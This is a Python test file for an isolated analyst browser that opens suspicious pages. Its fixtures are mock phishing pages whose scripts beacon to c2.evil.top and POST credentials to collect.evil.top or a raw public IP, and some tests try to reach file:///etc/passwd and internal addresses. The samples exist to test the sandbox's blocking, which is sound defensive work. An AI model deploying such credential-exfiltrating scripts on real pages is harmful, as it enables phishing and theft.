"""The isolated browser worker: needs Playwright's Chromium (its image has it).

Set BROWSER_EXECUTABLE to use another Chromium build."""

from __future__ import annotations

import base64
import json
import os
import sys
import threading
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import netlog  # noqa: E402
import nik_browser  # noqa: E402
import server  # noqa: E402

PAGE = b"""<!doctype html><html><head><title>Sign in</title></head><body>
<img src="https://cdn.evil.top/logo.png"><script>fetch('https://c2.evil.top/beacon').catch(() => {});
document.title = 'Sign in - script ran'; alert('Session expired');</script>
<form action="https://collect.evil.top/post" method="post"><input id="u" name="u"><button id="go">Go</button></form>
<a id="ext" href="https://evil.top/next" style="display:block;width:200px;height:40px">next</a>
<a id="local" href="http://10.0.0.1/admin" style="display:block;width:200px;height:40px">admin</a>
</body></html>"""


@pytest.fixture(scope="module")
def chromium():
    instance = nik_browser.Browser()
    yield instance
    for session_id in list(instance.sessions):
        instance.close(session_id, instance.sessions[session_id].owner)


def test_offline_session_runs_the_page_but_sends_nothing(chromium):
    state = chromium.open("alice", network=False, html=PAGE)
    assert state["attachment"] and state["title"] == "Sign in - script ran"
    assert base64.b64decode(state["screenshot"]).startswith(b"\xff\xd8")
    assert state["blocked"] >= 2  # the image and the beacon
    assert any(e["kind"] == "dialog" and "Session expired" in e["text"] for e in state["events"])
    # Typing goes to the page; following a link is refused without network.
    chromium.act(state["id"], "alice", {"type": "click", "x": 20, "y": 60})
    after = chromium.act(state["id"], "alice", {"type": "type", "text": "mario"})
    after = chromium.act(state["id"], "alice", {"type": "navigate", "url": "https://evil.top/next"})
    assert after["title"] == "Blocked by Nik"
    assert any(e["kind"] == "blocked" and "no network" in e["text"] for e in after["events"])
    back = chromium.act(state["id"], "alice", {"type": "back"})
    assert back["attachment"]
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(state["id"], "mallory", {"type": "refresh"})  # another analyst's session
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(state["id"], "alice", {"type": "key", "key": "Control+W"})
    chromium.close(state["id"], "alice")
    assert state["id"] not in chromium.sessions


def test_network_session_never_reaches_private_addresses(chromium):
    state = chromium.open("alice", network=True, html=PAGE)
    after = chromium.act(state["id"], "alice", {"type": "navigate", "url": "http://10.0.0.1/admin"})
    assert after["title"] == "Blocked by Nik"
    assert any("not a public address" in e["text"] for e in after["events"])
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(state["id"], "alice", {"type": "navigate", "url": "file:///etc/passwd"})
    chromium.close(state["id"], "alice")


def test_server_requires_the_token(chromium, monkeypatch):
    monkeypatch.setattr(server, "TOKEN", "test-token")
    monkeypatch.setattr(server, "BROWSER", chromium)
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), server.Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{httpd.server_address[1]}"

    def post(path, body, token="test-token"):
        request = urllib.request.Request(
            base + path, data=json.dumps(body).encode(), headers={"X-Browser-Token": token}
        )
        try:
            with urllib.request.urlopen(request, timeout=60) as response:
                return response.status, json.loads(response.read())
        except urllib.error.HTTPError as exc:
            return exc.code, json.loads(exc.read())

    html = base64.b64encode(PAGE).decode()
    assert post("/sessions", {"owner": "a", "html": html}, token="nope")[0] == 401
    assert post("/sessions", {"owner": "a"})[0] == 400
    assert post("/sessions", {"owner": "a", "url": "javascript:alert(1)"})[0] == 422
    status, state = post("/sessions", {"owner": "a", "html": html})
    assert status == 201 and state["network"] is False
    status, _ = post(f"/sessions/{state['id']}/action", {"owner": "a", "type": "scroll", "dy": 200})
    assert status == 200
    request = urllib.request.Request(
        f"{base}/sessions/{state['id']}?owner=a", method="DELETE", headers={"X-Browser-Token": "test-token"}
    )
    with urllib.request.urlopen(request, timeout=30) as response:
        assert response.status == 200
    httpd.shutdown()


# --------------------------------------------------------------------------- #
# Network log                                                                 #
# --------------------------------------------------------------------------- #
FORM_PAGE = b"""<!doctype html><title>Login</title><body>
<img src="https://cdn.evil.top/logo.png">
<script>
fetch('https://collect.evil.top/api/login', {method: 'POST', headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({user: 'mario', pass: 'Winter2026'})}).catch(() => {});
</script></body>"""
# A public address that needs no DNS: the submission is held before any connection.
HELD_PAGE = b"""<!doctype html><title>Held</title><body><script>
fetch('https://93.184.216.34/collect.php', {method: 'POST', body: 'pw=Winter2026'}).catch(() => {});
</script></body>"""


def _entries(chromium, session_id, owner="alice", bodies=True):
    return chromium.network(session_id, owner, 0, bodies)["entries"]


def test_offline_log_keeps_refused_requests_and_their_bodies(chromium):
    state = chromium.open("alice", network=False, html=FORM_PAGE)
    assert state["log"]["blocked"] >= 2
    entries = _entries(chromium, state["id"])
    page = next(e for e in entries if e["state"] == "local")
    assert base64.b64decode(page["response"]["body"]).startswith(b"<!doctype html>")
    post = next(e for e in entries if e["method"] == "POST")
    assert post["state"] == "blocked" and post["reason"] == "no network in this session"
    assert json.loads(base64.b64decode(post["request"]["body"])) == {"user": "mario", "pass": "Winter2026"}
    image = next(e for e in entries if e["url"].endswith("logo.png"))
    assert image["state"] == "blocked" and image["resourceType"] == "image"
    # The light list leaves the bodies out; a cursor returns only what changed.
    light = _entries(chromium, state["id"], bodies=False)
    assert all("body" not in (e.get("request") or {}) for e in light)
    cursor = chromium.network(state["id"], "alice", 0, False)["cursor"]
    assert chromium.network(state["id"], "alice", cursor, True)["entries"] == []
    with pytest.raises(nik_browser.BrowserError):
        chromium.network(state["id"], "mallory")
    chromium.close(state["id"], "alice")
    # Still readable after the session closed.
    after = chromium.network(state["id"], "alice", 0, False)
    assert after["closed"] and after["counts"]["requests"] == len(entries)


def test_network_session_holds_submissions_until_released(chromium):
    state = chromium.open("alice", network=True, html=HELD_PAGE)
    held = next(e for e in _entries(chromium, state["id"]) if e["method"] == "POST")
    assert held["state"] == "held" and base64.b64decode(held["request"]["body"]) == b"pw=Winter2026"
    assert state["log"]["held"] == 1 and state["releasePosts"] is False
    released = chromium.act(state["id"], "alice", {"type": "policy", "releasePosts": True})
    assert released["releasePosts"] is True
    chromium.close(state["id"], "alice")
    offline = chromium.open("alice", network=False, html=HELD_PAGE)
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(offline["id"], "alice", {"type": "policy", "releasePosts": True})
    chromium.close(offline["id"], "alice")


def test_bodies_are_kept_within_the_limits(monkeypatch):
    log = netlog.NetworkLog()
    monkeypatch.setattr(netlog, "BODY_MAX", 10)
    monkeypatch.setattr(netlog, "SESSION_MAX", 15)
    assert base64.b64decode(log.body(b"0123456789")["body"]) == b"0123456789"
    big = log.body(b"x" * 11)
    assert big["bodyTruncated"] and "body" not in big and big["bodySize"] == 11 and len(big["bodySha256"]) == 64
    assert log.body(b"123456")["bodyTruncated"]  # the session budget (15) is spent
    assert netlog.timing({"requestStart": 1, "responseStart": 21, "responseEnd": 30})["wait"] == 20


def test_inspect_reports_what_the_page_asks_for(chromium):
    page = (
        b"<title>Sign in</title><form action='https://collect.example/c' method='POST'>"
        b"<input name='user'><input type='password' name='pass'><button>Go</button></form>"
        b"<a href='https://example.com/'>help</a>"
    )
    state = chromium.open("alice", network=False, html=page)
    try:
        inspected = chromium.act(state["id"], "alice", {"type": "inspect"})
        facts = inspected["page"]
        assert inspected["title"] == "Sign in" and inspected["screenshot"]
        assert facts["passwordFields"] == 1 and facts["links"] == 1
        assert facts["forms"] == [
            {
                "action": "https://collect.example/c",
                "method": "post",
                "password": True,
                "inputs": ["text", "password", "submit"],
            }
        ]
    finally:
        chromium.close(state["id"], "alice")


# --------------------------------------------------------------------------- #
# Tabs, viewport, and the way out
# --------------------------------------------------------------------------- #
# Served for every address of the attachment: the opener, and (with ?popup) the window it opens.
POPUP_PAGE = b"""<!doctype html><html><head><title>Opener</title></head><body>
<button id="go" style="display:block;width:300px;height:60px"
  onclick="window.open('https://attachment.nik.invalid/?popup=' + Date.now(), '_blank', 'width=400,height=500')">
Sign in</button>
<script>if (location.search.includes('popup')) { document.title = 'Pop-up';
document.getElementById('go').setAttribute('onclick', 'window.close()'); }</script>
</body></html>"""


def _until(chromium, session_id, done, tries=20):
    """Refresh until ``done(state)``: a window opening or closing reaches the worker a moment later."""
    state = chromium.act(session_id, "alice", {"type": "refresh"})
    for _ in range(tries):
        if done(state):
            return state
        state = chromium.act(session_id, "alice", {"type": "refresh"})
    raise AssertionError(f"never happened; tabs: {state['tabs']}, events: {state['events']}")


def test_a_window_the_page_opens_is_a_tab_and_closing_it_shows_the_opener_again(chromium):
    state = chromium.open("alice", network=False, html=POPUP_PAGE)
    sid = state["id"]
    assert [tab["title"] for tab in state["tabs"]] == ["Opener"] and state["tabs"][0]["active"]

    chromium.act(sid, "alice", {"type": "click", "x": 50, "y": 30})
    opened = _until(chromium, sid, lambda s: len(s["tabs"]) == 2)
    # The new window is shown, at the session's size (not the 400x500 it asked for); the opener stays.
    assert opened["title"] == "Pop-up" and (opened["width"], opened["height"]) == (1280, 800)
    assert [(tab["title"], tab["active"]) for tab in opened["tabs"]] == [("Opener", False), ("Pop-up", True)]
    assert any(e["kind"] == "popup" and "new tab" in e["text"] for e in opened["events"])
    first, second = (tab["id"] for tab in opened["tabs"])

    # The analyst looks at the opener while the pop-up is open, then goes back to it.
    assert chromium.act(sid, "alice", {"type": "tab", "id": first})["title"] == "Opener"
    assert chromium.act(sid, "alice", {"type": "tab", "id": second})["title"] == "Pop-up"
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(sid, "alice", {"type": "tab", "id": "nope"})

    # The pop-up closes itself (a sign-in window that is done): the opener is shown again.
    chromium.act(sid, "alice", {"type": "click", "x": 50, "y": 30})
    closed = _until(chromium, sid, lambda s: len(s["tabs"]) == 1)
    assert closed["title"] == "Opener" and closed["tabs"][0]["active"]
    assert any("back to the one that opened it" in e["text"] for e in closed["events"])
    chromium.close(sid, "alice")


def test_tabs_are_closed_by_the_analyst_and_cannot_pile_up(chromium, monkeypatch):
    monkeypatch.setattr(nik_browser, "MAX_TABS", 2)
    state = chromium.open("alice", network=False, html=POPUP_PAGE)
    sid = state["id"]
    opener = state["tabs"][0]["id"]
    chromium.act(sid, "alice", {"type": "click", "x": 50, "y": 30})
    two = _until(chromium, sid, lambda s: len(s["tabs"]) == 2)

    # A third window is refused, and said.
    chromium.act(sid, "alice", {"type": "tab", "id": opener})
    chromium.act(sid, "alice", {"type": "click", "x": 50, "y": 30})
    full = _until(chromium, sid, lambda s: any("more than 2 tabs" in e["text"] for e in s["events"]))
    assert len(full["tabs"]) == 2

    after = chromium.act(sid, "alice", {"type": "closeTab", "id": two["tabs"][1]["id"]})
    assert [tab["title"] for tab in after["tabs"]] == ["Opener"] and after["title"] == "Opener"
    with pytest.raises(nik_browser.BrowserError, match="last tab"):
        chromium.act(sid, "alice", {"type": "closeTab", "id": opener})
    chromium.close(sid, "alice")


def test_the_viewport_follows_the_analysts_window(chromium):
    state = chromium.open("alice", network=False, html=PAGE, width=1600, height=900)
    sid = state["id"]
    assert (state["width"], state["height"]) == (1600, 900)
    with pytest.raises(nik_browser.BrowserError):
        chromium.act(sid, "alice", {"type": "click", "x": 1900, "y": 60})  # outside the page

    wide = chromium.act(sid, "alice", {"type": "resize", "width": 1920, "height": 1080})
    assert (wide["width"], wide["height"]) == (1920, 1080)
    # The picture is the page at that size: a JPEG whose frame header says so.
    picture = base64.b64decode(wide["screenshot"])
    marker = picture.index(b"\xff\xc0")
    assert int.from_bytes(picture[marker + 5 : marker + 7], "big") == 1080
    assert int.from_bytes(picture[marker + 7 : marker + 9], "big") == 1920
    chromium.act(sid, "alice", {"type": "click", "x": 1900, "y": 60})

    # Whatever is asked, the size stays within what the worker accepts.
    huge = chromium.act(sid, "alice", {"type": "resize", "width": 99999, "height": 1})
    assert (huge["width"], huge["height"]) == (nik_browser.MAX_WIDTH, nik_browser.MIN_HEIGHT)
    same = chromium.act(sid, "alice", {"type": "resize", "width": "wide", "height": None})
    assert (same["width"], same["height"]) == (nik_browser.MAX_WIDTH, nik_browser.MIN_HEIGHT)
    chromium.close(sid, "alice")


def _site(host, routes):
    """A web server on ``host`` answering ``routes`` ({path: (status, headers, body)}); returns (server, hits)."""
    from http.server import BaseHTTPRequestHandler

    hits = []

    class Site(BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802 - http.server naming
            hits.append(self.path)
            status, headers, body = routes.get(self.path, (404, {}, b"not found"))
            self.send_response(status)
            for name, value in {"Content-Type": "text/html", "Content-Length": str(len(body)), **headers}.items():
                self.send_header(name, value)
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *args):
            pass

    httpd = ThreadingHTTPServer((host, 0), Site)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd, hits


def test_a_redirect_to_a_private_address_goes_nowhere():
    """The hop of a redirect never passes the request check: the proxy is what stops it.

    127.0.0.1 plays the internet (the only address allowed out) and 127.0.0.2
    the internal network.
    """
    internal, internal_hits = _site("127.0.0.2", {"/admin": (200, {}, b"<title>Internal admin</title>secret")})
    secret = f"http://127.0.0.2:{internal.server_address[1]}/admin"
    public, public_hits = _site(
        "127.0.0.1",
        {
            "/": (200, {}, b"<title>Public page</title><img src='" + secret.encode() + b"'>hello"),
            "/redirect": (302, {"Location": secret}, b""),
        },
    )
    base = f"http://127.0.0.1:{public.server_address[1]}"
    instance = nik_browser.Browser(allow=lambda address: address == "127.0.0.1")
    try:
        state = instance.open("alice", network=True, url=f"{base}/")
        sid = state["id"]
        assert state["title"] == "Public page"
        # The page's own request to the internal address was refused before leaving.
        assert state["blocked"] >= 1

        after = instance.act(sid, "alice", {"type": "navigate", "url": f"{base}/redirect"})
        assert "/redirect" in public_hits
        assert internal_hits == []
        assert after["title"] == "Blocked by Nik"
        assert instance.egress.refused >= 1

        # The log says where each request really went, not the proxy's address.
        log = instance.network(sid, "alice", bodies=False)
        first = next(entry for entry in log["entries"] if entry["url"] == f"{base}/")
        assert first["response"]["serverIp"] == "127.0.0.1"
        assert first["response"]["serverPort"] == public.server_address[1]
        instance.close(sid, "alice")
    finally:
        public.shutdown()
        internal.shutdown()
